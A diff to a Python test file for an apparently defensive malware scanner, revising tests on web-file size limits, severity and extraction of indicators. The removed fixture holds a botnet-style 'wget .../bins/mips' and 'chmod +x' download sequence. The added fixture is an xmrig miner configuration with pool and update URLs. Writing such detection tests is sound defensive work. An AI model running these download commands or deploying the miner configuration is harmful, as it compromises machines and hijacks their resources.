@@ -145,8 +145,9 @@ def test_huge_web_files_stay_within_limits(rules: CompiledRules) -> None:
     assert timed(html, rules).file.kind == "html"
     js = b'"use strict";var a=function(){return 1};' * 400_000
     assert timed(js, rules).file.kind == "javascript"
-    css = b"a{color:red}" * 1_000_000
+    css = b"a{color:red}" * 300_000
     assert timed(css, rules).file.kind == "css"
+    assert timed(css * 2, rules).file.kind == "text"  # above the style sheet check limit
     pathological = b"{" + b"a:" * 2000 + b"}" + b"<" * 4000
     timed(pathological, rules)
     timed(b"x" * 150 + b"{" + b"y" * 150 + b"{" * 3000, rules)
@@ -168,15 +169,18 @@ def test_every_web_kind_has_no_links_and_the_lowest_severity(rules: CompiledRule
         assert (result.file.kind, result.severity, result.iocs) == (kind, "info", [])
 
 
-def test_a_rule_hit_still_raises_the_severity_of_web_content(rules: CompiledRules) -> None:
-    page = (
-        b"<html><body><pre>wget http://192.0.2.1/bins/mips\nwget http://192.0.2.1/bins/arm7\n"
-        b"chmod +x mips arm7\n</pre></body></html>"
+def test_web_content_that_a_rule_matched_is_read_like_text(rules: CompiledRules) -> None:
+    # A miner configuration is valid JSON, so it is web content by format, but a rule matched it:
+    # it gets the rule's family and severity, and its links are extracted and followed.
+    config = (
+        b'{"pools": [{"url": "stratum+tcp://203.0.113.9:4444"}], "donate-level": 1, '
+        b'"update": "http://192.0.2.1/xmrig.json"}'
     )
-    result = timed(page, rules)
-    assert result.file.kind == "html"
-    assert result.severity == "severe"
-    assert result.iocs == []
+    result = timed(config, rules)
+    assert result.file.kind == "json"
+    assert (result.family, result.severity) == ("xmrig", "warning")
+    assert [(i.kind, i.value) for i in result.iocs] == [("next_url", "http://192.0.2.1/xmrig.json")]
+    assert result.deobfuscated is not None
 
 
 def test_the_same_links_in_a_script_are_followed(rules: CompiledRules) -> None:
